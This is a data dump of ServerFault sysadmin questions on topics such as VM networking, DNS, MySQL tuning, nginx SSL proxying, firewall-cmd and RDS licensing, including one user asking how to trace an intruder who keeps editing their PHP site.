"1025457","How to properly setup VMs for testing (personal test)","<p>So both of my testing VMs are on the same laptop and both of them are running Windows Server 2019 and both of them are on the same SSD.
Basically, I need to test performance when the SQL database is on iSCSI disk in LAN network while the SSMS is on the local disk.</p>
<p>When I setup the machines and set their network adapter as bridged (needed it for something else) and ping each other I get average of less than 1ms which is, of course not desireable.</p>
<p>The issue is that I don't have any other PC with SSD so I can't transfer VM to other PC.</p>
<p>How can I make it proper testing environment - when the latency is around 50,60ms or something like that so it acts like other PC in the LAN network? Thanks in advance!</p>
","<networking><vmware-esxi><virtual-machines><iscsi>","2020-07-16 10:38:17"
"959179","Windows Remote Desktop Client fails to connect with error code 0x4","<p>When I connect to my Windows 10 machine from my Mac via Microsoft Remote Desktop client v10 or from Windows I'm getting an error:
Your session ended because of an error. If this keeps happening, contact your network administrator for assistance.
Error code: 0x4</p>
","<windows><remote-desktop><rdp>","2019-03-20 18:55:56"
"906691","How to point domain name into an IP address (ubuntu server)?","<p>I have one ubuntu server running in a specific ip address. Multiple apps are running with the help of gunicorn and nginx. I can access all those apps after editing the '/etc/hosts' file in my local machine. </p>

<p>Then, I bought a domain name. Now, the problem I'm having is to point my domain name to my ip address of the server.</p>

<p>I contacted the domain provider but they told me 'for custom name server you need to contact your hosting provider to point A record on your branded name server'. This went over my head, as I'm not familiar with these.</p>

<p>I researched a bit and found the use of 'BIND' but I'm not 100% sure. I don't want to end up breaking my server. So, what do i do?</p>
","<ubuntu><domain-name>","2018-04-09 07:20:40"
"1025516","Create user that has SFTP access to everything under vhosts, using Plesk","<p>I have a Centos 7 server running the latest version of Plesk.</p>
<p>I want to create a user called <code>all_sftp</code> that has sftp only access to everything under /var/www/vhosts/</p>
<p>I've made the user, chrooted so their home directory just has vhosts folder in it, I've they're in a group called sftponly and that's all working fine.</p>
<p>I then use setfacl to give that user permission to vhosts:</p>
<pre><code>setfacl -R  -m u:all_sftp:rwx /var/www/vhosts # set it on everything right now
setfacl -Rd -m u:all_sftp:rwx /var/www/vhosts # make it the default for newly added files/folders
setfacl -R -x u:all_sftp /var/www/vhosts/system # remove permissions for system folder
setfacl -Rd -x u:all_sftp /var/www/vhosts/system # remove default permissions for system folder
</code></pre>
<p>That works and gives the account access to everything in vhosts, however when I create a new website in Plesk the folder is created with 710 permissions and the all_sftp user is locked out.</p>
<p>How do I give the all_sftp access to new websites automatically?</p>
<p>Thanks!</p>
","<linux><centos7><access-control-list><user-permissions><plesk>","2020-07-16 15:47:45"
"959356","Is it poor practice to have db and site on different vms on same physical box?","<p>I am not too familiar with how virtual machines work but I was planning to have two physical machines each with two virtual machines on each physical box.  What I wanted to setup is a test environment with a test IIS site and a test sql instance on one physical machine.  The other machine would have a vm for the prod iis site along with the database on another vm on this same box.</p>

<p>So you have the following:</p>

<p>physical machine 1 (test instance)</p>

<ul>
<li>1 vm for iis</li>
<li>1 vm for sql server</li>
</ul>

<p>physical machine 2 (prod instance)</p>

<ul>
<li>1 vm for iis</li>
<li>1 vm for sql server</li>
</ul>

<p>Is this considered bad practice, would it be better to have both vm's on a specific machine running database (sql server) for instance.  Or is what I have an ok setup?</p>
","<virtual-machines>","2019-03-21 16:12:20"
"1025658","AttributeError: /usr/lib/libgdal.so.1: undefined symbol: OGR_F_GetFieldAsInteger64","<p>when I deploy my  project on google cloud I get the error</p>
<pre><code>File &quot;/opt/python3.7/lib/python3.7/ctypes/__init__.py&quot;, line 377, in __getattr__
   func = self.__getitem__(name)
File &quot;/opt/python3.7/lib/python3.7/ctypes/__init__.py&quot;, line 382, in __getitem__
  func = self._FuncPtr((name_or_ordinal, self))
 AttributeError: /usr/lib/libgdal.so.1: undefined symbol: OGR_F_GetFieldAsInteger64
</code></pre>
<p>my Dockerfile</p>
<pre><code>FROM gcr.io/google-appengine/python

  RUN apt-get update &amp;&amp; apt-get install -y \
     binutils \
   gdal-bin \
   python-gdal

   # Create a virtualenv for dependencies. This isolates these packages from
   # system-level packages.
   RUN virtualenv /env -p python3.7

   # Setting these environment variables are the same as running
   # source /env/bin/activate.
   ENV VIRTUAL_ENV /env
   ENV PATH /env/bin:$PATH

   # Copy the application's requirements.txt and run pip to install all
   # dependencies into the virtualenv.
   ADD  requirements.txt /app/requirements.txt
   RUN pip install -r /app/requirements.txt
   # Add the application source code.
   ADD . /app

   # Run a WSGI server to serve the application. gunicorn must be declared as
   # a dependency in requirements.txt.
   gunicorn -b :$PORT tiwari.tiwari.wsgi
</code></pre>
","<django><google-app-engine>","2020-07-17 15:11:19"
"959363","PureFTPD: ERROR TLS renegociation","<p>I set up a server which is working fine. No errors and all services are running well.</p>

<p>I am using ISPConfig 3.1, Ubuntu 18 and Pure-FTPD</p>

<p>When I create a new FTP-user, I have a problem logging in via FTPS.</p>

<ul>
<li>I have a valid certificate</li>
<li>Pure-FTPD is set to use TLS</li>
<li>Passive FTP is active in Filezilla</li>
</ul>

<p><strong>/var/log/syslog</strong> reports the following:</p>

<blockquote>
  <p>pure-ftpd: (?@987.654.321.001) [INFO] New connection from 987.654.321.001</p>
  
  <p>pure-ftpd: (?@987.654.321.001) [DEBUG] Command [auth] [TLS]</p>
  
  <p>pure-ftpd: (?@987.654.321.001) [ERROR] TLS renegociation</p>
</blockquote>

<p><strong>Filezilla</strong> reports the following:</p>

<blockquote>
  <p>Status:   Auflösen der IP-Adresse für demo.example.de</p>
  
  <p>Status:   Verbinde mit 123.123.123.123:21...</p>
  
  <p>Status:   Verbindung hergestellt, warte auf Willkommensnachricht...</p>
  
  <p>Status:   Initialisiere TLS...</p>
  
  <p>Status:   Überprüfe Zertifikat...</p>
  
  <p>Status:   TLS-Verbindung hergestellt.</p>
  
  <p>Befehl:   USER blubbalo_bill</p>
  
  <p>Fehler:   Konnte vom Socket nicht lesen: <strong>ECONNRESET - Verbindung durch Peer zurückgesetzt</strong> (Connection denied by peer)</p>
  
  <p>Fehler:   <strong>Herstellen der Verbindung zum Server fehlgeschlagen</strong> (Connection failed)</p>
</blockquote>

<p>I hope somebody can help me to solve the error.</p>
","<ftps><pureftpd>","2019-03-21 16:45:42"
"959367","htacces RewriteRule does not trigger on every request","<p>We just tested an extension for a CMS which aims to create .webp images for other formats and deliver this .webp version to the browser instead of the original.</p>

<p>The key is this .htaccess RewriteRule:</p>

<pre><code>RewriteCond %{HTTP_ACCEPT} image/webp
RewriteCond %{DOCUMENT_ROOT}/$1.$2.webp -f
RewriteRule ^(fileadmin/.+)\.(png|jpg|jpeg)$ $1.$2.webp [T=image/webp,E=accept:1]
</code></pre>

<p>But this rule only triggers sometimes.
Eg. for a page with 4 images the browser randomly receives the .jpg version or the .webp version of each image. Both versions exist in a subdirectory of ""./fileadmin/"" directory along each other (e.g. someimage.jpg and someimage.jpg.webp).
It does not depend on the image. Each of the images on a page shows this behaviour - sometimes .jpg, sometimes .webp.</p>

<p>Any idea what can be the reason and how to fix this?</p>
","<.htaccess>","2019-03-21 16:55:01"
"906883","How to make server instance?","<p>Is there any way to divide the big server in small small server instance like i have 32gb RAM and 64 Ip's and 2 Tb HDD server form digital ocean.</p>

<p>Example</p>

<p>2 GB RAM 40GB 4 ips in instance 1.(install Ubuntu)</p>

<p>same config in instance 2.(centos)</p>

<p>same config in instance 3(any other OS)</p>

<p>and so on..as possible</p>

<p>I try opennebula but not succeed.</p>
","<linux>","2018-04-10 07:59:53"
"1025714","Regarding Hosting Static website in Digital ocean spaces","<p>I need to host my static website in Digital ocean space. I am looking for something similar that we do in AWS S3 static website hosting in the Digital ocean. Is the feature is available in DO? Looking for some DO experts to render their hands on this.</p>
<p>Thanks in advance!!</p>
","<nginx><lamp><web>","2020-07-18 04:42:39"
"1025719","How to downgrade back to an older version of postgresql","<p>I upgraded to OSX Catalina, and in the process of fixing broken packages managed to inadvertently upgrade <code>posgresql</code> from version 11 to version 12. When I try to start <code>postgresql</code> I see the following in the log:</p>
<pre><code>2020-07-18 17:51:16.885 AEST [42394] FATAL:  database files are incompatible with server
2020-07-18 17:51:16.885 AEST [42394] DETAIL:  The data directory was initialized by PostgreSQL version 11, which is not compatible with this version 12.3.
</code></pre>
<p>How do I remove version 12, and then reinstall version 11? I am not sure which which minor release of version 11 I am using. I prefer to use <code>brew</code>.</p>
","<postgresql>","2020-07-18 08:07:04"
"907016","Solaris - How to tell whether machine is running SPARC or Intel Chip","<p>What command can I run to tell whether SunOS 5.10 is running a SPARC or Intel chip?</p>
","<unix><solaris><unix-shell><sunos>","2018-04-10 19:12:26"
"1025909","How to diagnose what's causing InnoDB to run out of space?","<p>Site used to go down frequently on a near daily basis and is on Digitalocean VPS</p>
<p>Based on some suggestions I got on DO forum, I ran mysqltuner and increased innodb buffer pool size to 341M and innodb log file size to 64M</p>
<p>Since then the site goes down less but it still does every once in a while like last night.</p>
<p>There are plently of 'InnoDB: Cannot allocate memory for the buffer pool' in the <a href=""https://pastebin.com/TpAfNDbD"" rel=""nofollow noreferrer"">mysql error log - pastebin</a></p>
<p>I've assigned swap space and I've ran netstat, vmstat etc too and everything seems alright.</p>
<p>But clearly I'm running out of memory as the logs suggest. How do I diagnose whats causing my server to run out of memory? Whether its a faulty plugin or apache or something else causing the issue instead of just upgrading the droplet?</p>
","<mysql><wordpress><digital-ocean>","2020-07-20 07:08:27"
"1025945","Can you force graceful shutdown of a locked Windows Server 2003?","<p>I have a (physical) Server with Windows Server 2003 which is currently locked by the Administrator account and no one has the password.</p>
<p>It should be straightforward to reset the password using one of the bootable tools that are available, but to use them, the server obviously has to be shut down first.</p>
<p>ACPI shutdown (via power button) is disabled on this server, shutdown from the lock screen is disabled as well.</p>
<p>Since we do not want to pull the power, is there another way to force a graceful shutdown?</p>
","<windows-server-2003><shutdown><acpi>","2020-07-20 11:23:39"
"907152","What happens if you have NS domains be resolved by their own NS servers?","<p>Let me explain.</p>

<p>For example, you have a site, <code>site.com</code>, and on the domain provider service, you decide you want to have your own nameservers, and enter the new addresses.</p>

<p>You decide to let these nameservers have domain names, <code>ns.site.com</code>.</p>

<p>Now what happens if a client wants to resolve <code>my.site.com</code>, as far as i understand it, it (client and/or recursive DNS servers) will ask for authority for the second level domain record of <code>site.com</code>, pick the NS name from it, and resolve that to contact it.</p>

<p>Now we have set the nameserver to <code>ns.site.com</code>, which lays in it's own domain... wait, that's recursive.</p>

<p>This is exactly what I think could be a problem, how is it solved in the real world? Does/did this ever happen?</p>
","<networking><domain-name-system><nameserver><dns-zone>","2018-04-11 12:58:47"
"1026062","yum update doesn't update the package","<p>I'm on RHEL 7. Security team suggested me to update <code>curl</code> and <code>dbus</code> packages. When I try <code>yum update </code>, it says</p>
<pre><code>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
This system is not registered with an entitlement server. You can use subscription-manager to register.
No packages marked for update
</code></pre>
<p>I verified that the packages are old as mentioned by security team.</p>
<p>Below are the screenshots I received from security team.
<a href=""https://i.sstatic.net/ORaxs.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ORaxs.png"" alt=""enter image description here"" /></a>
<a href=""https://i.sstatic.net/6TTqR.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/6TTqR.png"" alt=""enter image description here"" /></a></p>
<p>How can I update the packages as suggested?</p>
","<redhat><yum><rhel7>","2020-07-21 06:43:40"
"959753","Azure Permissions in Large Organizations","<p>I know this question is a little subjective.  My intent is to just ask how typical large organizations setup their cloud permissions.  I'm particularly interested in Azure implementations.  </p>

<p>I'm a developer in a large healthcare company (20k+ employees 1-2k IT professionals).  We have rolled out our own Azure implementation but have granted developers pretty much no permissions into the azure portal.  If I need infrastructure for projects I need to submit a ticket to request it.  Once I get the infrastructure I can do nothing to it in the portal.  If I need to have some Azure Active Directory application roles created, or if I want to make a change to my app service (like enabling Managed Service Identities) I need to submit a ticket to our Cloud Intrastructure team.  Is this typical or do other large organizations grant developers more privileges (especially in non production environments)?</p>

<p>From a developer's perspective our setup is madness.  I end up writing powershell scripts and send them in tickets to infrastructure people (or sometimes to Active Directory Administrators) and they end up executing the scripts without understanding what they are doing.</p>

<p>I have a feeling this is probably an artifact of our companies culture, but maybe not.  Is allowing developers 0 permissions in the azure portal a typical thing?</p>
","<azure><sysadmin>","2019-03-24 19:13:18"
"1026124","Stongswan and Libreswan in Centos","<p>I have a server running stongswan with one VPN connection.</p>
<p>Can I add another VPN connection Via Libreswan on the same server?</p>
<p>So the server will run both Strongswan and Libreswan.</p>
<p>Regards,
Michael</p>
","<centos7><ipsec><strongswan><libreswan>","2020-07-21 13:16:54"
"1026174","MYSQL vs. InnoDB","<p>mysqltuner output.</p>
<pre><code>-------- Storage Engine Statistics -----------------------------------------------------------------
[--] Status: +ARCHIVE +BLACKHOLE +CSV -FEDERATED +InnoDB +MEMORY +MRG_MYISAM +MyISAM +PERFORMANCE_SCHEMA 
[--] Data in InnoDB tables: 11G (Tables: 44100)
[--] Data in MyISAM tables: 458G (Tables: 52114)
[!!] Total fragmented tables: 13
</code></pre>
<p>Here is my.cnf</p>
<pre><code>[mysqld]
symbolic-links=0
user            = mysql
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
log-error = /var/log/mysql/error.log
log-warnings = 2
symbolic-links=0
lc-messages-dir = /usr/share/mysql
skip-external-locking
key_buffer              = 2G
thread_stack            = 192K
thread_cache_size       = 350
myisam-recover         = BACKUP
max_connections        = 1500
query_cache_limit       = 100M
query_cache_size        = 512M
general_log             = 0
long_query_time = 10
bind-address = 0.0.0.0
old_passwords=1
skip-secure-auth
innodb_buffer_pool_size  = 30G
innodb_stats_on_metadata=0
table_open_cache = 4096
skip-external-locking
skip-name-resolve
ft_min_word_len = 2
innodb_buffer_pool_instances = 30
innodb_file_per_table=0
innodb_checksum_algorithm=INNODB
binlog_checksum=NONE
</code></pre>
<p>I want to cache as much data as possible for MyISAM data-set as well. Currently have dedicate <code>innodb_buffer_pool_size  = 30G</code> for innodb but its only 11 GB in size, which looks me a waste of RAM at all.</p>
<p>What is the best way to cache MyISM data..</p>
<p>My System is suffering from 100% usage on IO, whereas I have plenty of RAM available on system</p>
<p>I'm not able to utilise more than 15GB of RAM from 62GB on a 24 Core Hardware box with 5 TB of RAID storage.</p>
","<linux><mysql><performance><storage><io>","2020-07-21 18:36:33"
"907521","How many RDS CAL licenses do I need?","<p>I have 1 server with OS Windows Server 2012R2 where I need to install Remote Desktop Services role. I know that without RDS CAL I can connect to this server via RDP 2 users but what when I need to connect 10 users?
Do I have to buy all 10 CALs or maybe buy only 8 CALs and link them with 2 already exists?</p>
","<windows-server-2012-r2><licensing><rds><microsoft>","2018-04-13 13:46:58"
"1026205","How to detect how an intruder is gaining access to my server?","<p>I previous asked <a href=""https://stackoverflow.com/questions/63019380/how-could-the-php-source-code-of-my-website-have-been-maliciously-changed"">this question</a> on StackOverflow. I was recommended here for help. There are some more details on that question.</p>
<p>Someone has somehow gained unauthorized access to my website. They have been changing the PHP source code of the site to inject Google ads. My database and other sites on the hosting plan seem unaffected, though I have everything backed up just in case they are able to get deeper access.</p>
<p>The site is hosted on a shared hosting, It's coded in PHP (version 7.4) and running under Apache.</p>
<p>The hosting provider was not helpful. The recommended changing my passwords (which I had already done: FTP, CPanel, and hosting account passwords). They claim they don't have any logs on the system to check. The ads are still being re-inserted into the code every time I remove them.</p>
<p>The injected code is different every time, and does not appear to be computer-generated, so I am certain the changes are being made by an actual human with access to the system, not malware.</p>
<p>At the recommendation of one of the StackOverflow answers, I am scanning the site for vulnerabilities with Arachni. That scan has been running for about an hour and a half and is still going, but so far nothing helpful has surfaced there.</p>
<p>I need to figure out how the attacker is gaining access to change my source code. I'm out of ideas for places to look. How can I detect how the attacker is accessing the server so I can shut them out?</p>
","<php><security><apache2>","2020-07-21 22:51:04"
"960110","Domain name with https and without www doesn't work","<p>I have setup custom domain for google-site, with namecheap as domain name provider.</p>

<p>I'm referring to the documentation of <a href=""https://support.google.com/sites/answer/9068867?hl=en"" rel=""nofollow noreferrer"">https://support.google.com/sites/answer/9068867?hl=en</a> and <a href=""https://www.namecheap.com/support/knowledgebase/article.aspx/9252/2208/how-do-i-add-my-domain-to-google-sites"" rel=""nofollow noreferrer"">https://www.namecheap.com/support/knowledgebase/article.aspx/9252/2208/how-do-i-add-my-domain-to-google-sites</a></p>

<p>Here's my setup in namecheap</p>

<p><a href=""https://i.sstatic.net/SyNBV.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/SyNBV.png"" alt=""enter image description here""></a></p>

<p>However, not all domain are working</p>

<ul>
<li><a href=""http://wenote.me"" rel=""nofollow noreferrer"">http://wenote.me</a> (works)</li>
<li><a href=""https://www.wenote.me"" rel=""nofollow noreferrer"">https://www.wenote.me</a> (works)</li>
<li><a href=""http://www.wenote.me"" rel=""nofollow noreferrer"">http://www.wenote.me</a> (works)</li>
<li><a href=""https://wenote.me"" rel=""nofollow noreferrer"">https://wenote.me</a> (NOT WORKING)</li>
</ul>

<p>The one which starts with https, and without www doesn't work.</p>

<p>Any idea how I can make it work? Currently, I didn't purchase SSL cert from domain provider. Is that the reason why it doesn't work?</p>
","<domain-name-system>","2019-03-26 19:20:20"
"1026283","Cost forecast Azure vs pricing tier costs of SQL database","<p>I have an SQL database on Azure with „Basic“ pricing tier (i.e. 5 DTUS and 2 GB storage) for a price of 7.38 CHF per month.
However, when I go to my subscription, in the „Overview“ section there is a plot that shows the spending rate and a forecast that shows that the costs will be 9.80 CHF.
Until now I was under the assumption that the costs would not change (unless I change the pricing tier of course). What did I miss? How can I more accurately know the costs in advance?</p>
","<azure>","2020-07-22 12:23:32"
"1026318","Webmin redirects to my hostname instead of my domain name","<p>I have Webmin working on a domain with an SSL certificate. However, when I visit it over HTTP, it redirects to <code>https://hostname:10000</code> instead of the domain name.</p>
<p>I've set the FQDN in <code>/etc/hosts</code> (because I can't find any other way to do it - can't find anything on this mysterious &quot;systemd-resolved&quot; to edit my resolv.conf file, and all the online guides say &quot;use <code>resolvconf</code>&quot; which I don't even have) like so:</p>
<pre><code>127.0.1.1 hostname.example.com hostname
</code></pre>
<p>(it was <code>127.0.1.1</code> before, not <code>127.0.0.1</code>)</p>
<p><code>hostname</code> returns my hostname, <code>hostname --domain</code> returns my domain, and <code>hostname -f</code> returns the FQDN that I have set.</p>
<p>But Webmin doesn't care. Webmin wants to be special. Webmin decides to assume that my hostname is my domain name, and redirect to that instead. How do I fix this?</p>
<p>Some sites say I should edit the Webmin source code, but that would get reverted as soon as I update, and is also kind of not the best solution in general.</p>
","<hostname><ubuntu-18.04><webmin>","2020-07-22 17:27:27"
"960184","How much bandwidth do I need to buy from my ISP to upload 21.4MB of data consistently without experiencing severe downtimes","<p>My ISP provides me with 10mbps but my network is very slow at all times, I have done a speed test, both download and upload is 12.5MB. How much bandwidth should my ISP provide so that I may not experience downtimes and slow internet?</p>
","<networking>","2019-03-27 07:22:41"
"1026329","Is it ""common"" for an IT department to provide a Network SLA to the business internally?","<p>Service Level Agreements (SLAs) are pretty common when services are being purchased, we all expect that our business grade ISP, cloud providers, etc will offer a guarantee of 99.9% uptime, X amount of bandwidth, et al...</p>
<p>My question however is, is it common to have a similar written, contractual obligation within a company such that the IT department provides an SLA, not necessarily to the employees but to the other business units.</p>
<p>There are obviously other factors that include size of the company and the IT department, the company structure as some companies IT actually bills the other departments for service, and many more, but as a broad generality is this something that &quot;most&quot; companies would or would not do?</p>
","<networking><performance-monitoring><metrics><sla>","2020-07-22 19:58:05"
"1026356","what am I doing wrong in nginx / docker to get connect() failed (111: Connection refused) while connecting to upstream ? (SSL)","<p>I am trying to solve why I am getting on docker / nginx container error 502 with connect() failed (111: Connection refused) when I setup properly the ssl , but I got this issue . I dont see clerly where it comes from . how can I fix this?</p>
<pre><code>upstream web_server {
    server web:8000;
}

server {

    listen 80;
    server_name demo.io www.demo.io;

    access_log /var/log/nginx/demo.io.log;
    error_log /var/log/nginx/demo.io.log;

    location / {
        rewrite ^ https://$host$request_uri? permanent;
        proxy_pass http://web_server;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_redirect off;
    }

    location /static/ {
        alias /home/app/web/static/;
    }
}
#https://demo.io
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name demo.io;

    server_tokens off;

    ssl_certificate /etc/letsencrypt/live/demo.io/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/demo.io/privkey.pem;

    ssl_buffer_size 8k;

    ssl_dhparam /etc/ssl/certs/ssl-dhparams.pem;

    ssl_protocols TLSv1.2 TLSv1.1 TLSv1;
    ssl_prefer_server_ciphers on;

    ssl_ciphers ECDH+AESGCM:ECDH+AES256:ECDH+AES128:DH+3DES:!ADH:!AECDH:!MD5;

    ssl_ecdh_curve secp384r1;
    ssl_session_tickets off;

    # OCSP stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8;

    location / {
        proxy_pass https://web;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_redirect off;
    }
}

</code></pre>
","<nginx><docker><django>","2020-07-23 03:34:49"
"836214","What programming languages should I leanr if I want to make a social media app/website like facebook?","<p>The title says it all. What programming languages will I need to learn to create a social media app/website like Facebook?</p>
","<website>","2017-03-04 03:47:35"
"1026363","How to uninstall ssh-keygen utility safely?","<p>I am being tasked to remove ssh-keygen from Ubuntu servers and I don't want to break the computer. Can you please help, how to uninstall ssh-keygen utility safely?</p>
<p>Thanks</p>
","<linux><ubuntu><ssh><ssh-keys><ssh-keygen>","2020-07-23 05:29:45"
"836251","Installing/Updating Root Certificates in Windows Server 2003","<p>First of all, I'm not a Sysadmin, I'm a developer. My Problem is now that the Application I develop is installed and runs on an Windows Server 2003 at a client. </p>

<p>I'm using AWS SES Service to send e-Mails to Members or Customers. Since the SSL Certs of this Server is out of date, the connection can not be established. </p>

<p>My question is now: 
How can I update (at best all) Root CAs in Windows Server 2003 so the SES Service will work? </p>
","<windows-server-2003><certificate><amazon-ses>","2017-03-04 09:57:38"
"907744","Add firewall-cmd service permanently","<p>On RHEL 7, I am trying to add service <code>postgresql</code> permanently.</p>

<p>Without --permanent option, the command below runs well.</p>

<pre><code>[root@sample services]# firewall-cmd --list-services
dhcpv6-client http https ssh
[root@sample services]# firewall-cmd --add-service=postgresql
success
[root@sample services]# firewall-cmd --list-services
dhcpv6-client http https postgresql ssh
[root@sample services]#
</code></pre>

<p>However, when using --permanent option, below error surfaces.</p>

<pre><code>[root@sample services]# firewall-cmd --remove-service=postgresql
success
[root@sample services]# firewall-cmd --add-service=postgresql --permanent
Error: INVALID_SERVICE: oracle
</code></pre>

<p>Why is the error mentioning 'oracle'? How do I actually allow 'postgresql' service permanently via firewall-cmd?</p>
","<redhat><firewall-cmd>","2018-04-15 14:50:16"
"1026441","RAID supercapacitor only card (to replace BBU maintenance free)","<p>An excellent article here: <a href=""https://www.servethehome.com/raid-controller-batteries-time-bombs-you-need-to-replace/"" rel=""noreferrer"">https://www.servethehome.com/raid-controller-batteries-time-bombs-you-need-to-replace/</a></p>
<blockquote>
<p>Are RAID controller lithium-ion batteries ticking time bombs within your server? Over this past weekend, we saw an IBM ServeRAID battery pack that looked ominous. Everyone knows that RAID controller batteries need to be replaced at regular intervals. That is one of the key drivers towards supercapacitors on RAID cards. Before this weekend, our assumption that it was a matter of keeping data safe in the event of a power failure. After this weekend, we now think it may be a safety issue.</p>
</blockquote>
<p>My question is, which modern RAID controllers have done away with batteries and now use strictly supercapacitors (and maintenance free)?</p>
<p>Google points me to this @ <a href=""https://www.ibm.com/support/knowledgecenter/POWER9/p9ed5/ared5pcie3comp.htm"" rel=""noreferrer"">https://www.ibm.com/support/knowledgecenter/POWER9/p9ed5/ared5pcie3comp.htm</a> but I am after a non-OEM'd units if possible to avoid me having to buy vendor locked HDD.</p>
","<raid><hardware-raid><battery>","2020-07-23 15:14:36"
"907806","Read/Write Split in Mongodb","<p>We are looking for some load balancing tool which can split read and write load in between replica and master node, I know it can be possible through driver or application level but I would like to do at databases level i.e ProxySQL for MySQL DB </p>
","<load-balancing><mongodb><multi-threading>","2018-04-16 08:05:17"
"836351","Exclude certain hosts from Payara Server access log","<p>We have an external load balancer that makes health checks to the application servers. We use conditional logging in our current Apache TomEE server to prevent this activity from filling up the HTTP Access Log.</p>

<p>Since we are migrating to Payara, we would like to know how the same can be done.</p>

<p>Regards,
Jalal</p>
","<glassfish>","2017-03-05 04:07:28"
"836414","Do Docker and VirtualBox play well together on Linux?","<p>I'm currently having issues with a server which randomly freezes. The server is running:</p>

<ol>
<li>OpenSUSE 42.2, with latest updates</li>
<li>Kernel 4.10.1-2.g561cf31-default (from <a href=""http://download.opensuse.org/repositories/Kernel:/stable/standard/x86_64/"" rel=""noreferrer"">kernel.opensuse.org)</a></li>
<li>Docker version 1.12.6, build 78d1802</li>
<li>VirtualBox 5.1.14r112924</li>
<li>The machine has 12 cores &amp; 32GB ram and has hyper threading enabled. (after all services have been started there is ~19GB free RAM left)</li>
</ol>

<p>For a long time we have been using <code>VirtualBox</code> to create virtual machines with various Linux distributions so we can test our product. Recently we decided to migrate our Linux based <code>VirtualBox</code> machines to <code>Docker</code>. Unfortunately we can't fully migrate to <code>Docker</code> just yet. This is why we have kept a 1 virtual machine running as well. At first, everything was working flawlessly, but once time went by, the machine started freezing randomly. There are no logs and nor indication of what might be causing this. I have ruled out hardware issues - we have enough CPU, RAM and HDD to run all the services we need and the hardware is working fine.</p>

<p>As an experiment, I stopped all of the <code>VirtualBox</code> machines and disabled all <code>VirtualBox</code> related services which were starting at boot and rebooted. So far we haven't had a single freeze. </p>

<p>This leads to my questions - can <code>Docker</code> and <code>VirtualBox</code> run on the same machine without interfering with each other?</p>
","<docker><virtualbox><opensuse>","2017-03-05 18:40:20"
"1026629","Can you use subdomains of microsoft domain to host your own html websites?","<p>Like github.io, heroku, they allow you to host content in their subdomain like xxx.github.io, yyyy.heroku.com.</p>
<p>I am wondering can is it possible for me as a global admin of office 365 to host html website at subdomain of Microsoft assets like</p>
<p>*.microsoftonline.com *.office365.com *.microsoft.com ?</p>
<p>So for example, I can host my application on xxx.microsoftonline.com.</p>
<p>Is it possible for you to set cname or A record of xxx.microsoftonline.com to your own domain or ip address?</p>
<p>Or you can edit html file in such subdomain?</p>
<p>Do Microsoft provide such functionality?</p>
","<microsoft-office-365>","2020-07-24 17:29:06"
"907892","How do I internally rewrite all requests to subdirectory?","<p>I'm using Laravel 5.6, and I can only upload/edit files to/in the root of the website (<code>/public_html</code>). I cannot change the website root to <code>/public_html/public</code>. Is it possible to rewrite <strong>all</strong> requests (e.g. <code>/</code>, <code>/login</code>, <code>/css/styles.css</code> etc.) internally to <code>/public_html/public/</code>?</p>

<p>I don't know how to write .htaccess files.
I tried many different things I found online. The last thing I tried was this in <code>/public_html/.htaccess</code>:</p>

<pre><code>RewriteEngine On

RewriteRule ^(.*)$ /public/$1 [L]
</code></pre>
","<apache-2.4><.htaccess><mod-rewrite><rewrite>","2018-04-16 16:05:02"
"1026686","What Can ELB Do That ALB Cannot?","<p>In AWS, is there anything ELB (Elastic Load Balancer) can do that ALB (Application Load Balancer) cannot?</p>
<p>And if the answer is nothing, then is there any incentive to choose ELB over ALB?</p>
","<amazon-web-services><load-balancing><infrastructure>","2020-07-25 09:15:03"
"1026688","Bufferbloat : Why not just have super large buffers?","<p>A bit of a big picture question here but I was wondering what was the logic behind not just having incredibly large network related buffers?</p>
<p>One would think that getting as much of the data as close to the target as quickly as possible, be it an external machine (TCP buffers, etc), or internally (ring buffers, etc) in a machine, would be ideal?</p>
","<networking><ethernet><buffer>","2020-07-25 09:35:50"
"960492","Physical security for Servers","<p>I work in a non-profit and we need to upgrade the physical security around our new servers and DC. We can't secure the entire room, and we can't afford to purchase a proper server rack. The workaround is that the equipment will be in a nook that has walls on three sides, and we will use some sort of locking security door. However, I am struggling to locate anything that would suffice as a locking security door. I am here to ask for resources and knowledge on the topic. If anyone here has knowledge of affordable, non-standard, physical security options. </p>
","<security><physical-security>","2019-03-28 17:38:17"
"907922","Bandwidth: How many nodes can a 15Mbps connection serve?","<p>I have looked for an answer but can't seem to find what I'm looking for so thought I'd ask here.</p>

<p>We have decided to get a connection from a local ISP offering an upload speed of 15Mbps to serve a site we've developed. We expect that the site will have a decent about of traffic after about 5 or 6 months. During the initial 6 months, I don't plan to have any more than maybe 100 to 200 people a day coming to the site.</p>

<p>The site is all image based, so a single pageload may be around 3Mb each.</p>

<p>I'm concerned that maybe 15Mbps may not be able to serve very many nodes simultaneously. Is there a formula to figure this out? Or maybe even a calculator that can address this question?</p>
","<bandwidth>","2018-04-16 18:27:20"
"1026754","Guess current date/time on remote server","<p>I want to know the current date/time of a remote server.
I do not have any access on this server.</p>
<p>This server expose OpenSSH (port 22) and apache2 (port 80)</p>
<p>Is there a fingerprint technique that can reveal current timestamp on this 2 services ?</p>
<p>Thanks</p>
","<hacking><fingerprint>","2020-07-26 06:20:53"
"960548","Recently purchased domain name at SiteGround redirects to a GoDaddy parked page","<p>I'm doing a freelance job and the client provided me with the account details of a recently purchased SiteGround account, I proceeded to put a test index.php in the public_html folder. But when I try to access the website through the domain name (<a href=""http://goldenbranch-dates.com"" rel=""nofollow noreferrer"">goldenbranch-dates.com</a>) it redirects me to a GoDaddy page that says :</p>

<blockquote>
  <p>Welcome to goldenbranch-dates.com.
  This Web page is parked for FREE, courtesy of GoDaddy.com.</p>
</blockquote>

<p>Yet I can still access the index.php through the <a href=""http://146.66.92.114/~golde747"" rel=""nofollow noreferrer"">IP address</a>.</p>

<p>Is this a DNS propagation issue that will be auto resolved in time or something more ?</p>
